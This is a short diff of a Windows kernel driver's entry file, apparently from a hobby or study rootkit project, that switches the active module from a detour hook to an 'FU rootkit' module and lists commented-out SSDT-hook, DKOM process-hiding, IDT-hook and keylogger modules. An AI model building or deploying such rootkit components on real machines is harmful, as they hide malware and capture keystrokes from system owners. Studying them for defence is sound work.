@@ -10,7 +10,10 @@
 //#include "hookssdt.h"
 //#include "dkomeprocess.h"
 //#include "idthook.h"
-#include "detour.h"
+//#include "detour.h"
+//#include "dt_template.h"
+//#include "klog.h"
+#include "fu_rootkit.h"
 
 VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
 {
@@ -19,24 +22,30 @@ VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
 	//DE_OnUnload(DriverObject);
 	//IH_OnUnload(DriverObject);
 	//Hp_OnUnload(DriverObject);
-	DT_OnUnload(DriverObject);
-	
+	//DT_OnUnload(DriverObject);
+	//DTT_OnUnload(DriverObject);
+	//Klog_OnUnload(DriverObject);
+	FU_OnUnload(DriverObject);
 	return;
 }
 
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, 
 					 IN PUNICODE_STRING theRegistryPath)
 {
-   // Register a dispatch function for Unload
-   theDriverObject->DriverUnload  = OnUnload; 
+	// Register a dispatch function for Unload
+	Ktrace("(MYRKT)Register a dispatch function for Unload...\n");
+	theDriverObject->DriverUnload  = OnUnload; 
+	
+	Ktrace("(MYRKT)Onload called\n");
+	
+	NTSTATUS status = STATUS_SUCCESS;
+	//status = DE_Onload(theDriverObject, theRegistryPath);
+	//status = IH_Onload(theDriverObject, theRegistryPath);
+	//status = Hp_Onload(theDriverObject, theRegistryPath);
+	//status = DT_Onload(theDriverObject, theRegistryPath);
+	//status = DTT_Onload(theDriverObject, theRegistryPath);
+	//status = Klog_Onload(theDriverObject, theRegistryPath);
+	status = FU_Onload(theDriverObject, theRegistryPath);
 
-   Ktrace("(MYRKT)Onload called\n");
-
-   NTSTATUS status = STATUS_SUCCESS;
-   //status = DE_Onload(theDriverObject, theRegistryPath);
-   //status = IH_Onload(theDriverObject, theRegistryPath);
-   //status = Hp_Onload(theDriverObject, theRegistryPath);
-   status = DT_Onload(theDriverObject, theRegistryPath);
-   
-   return status;
+	return status;
 }
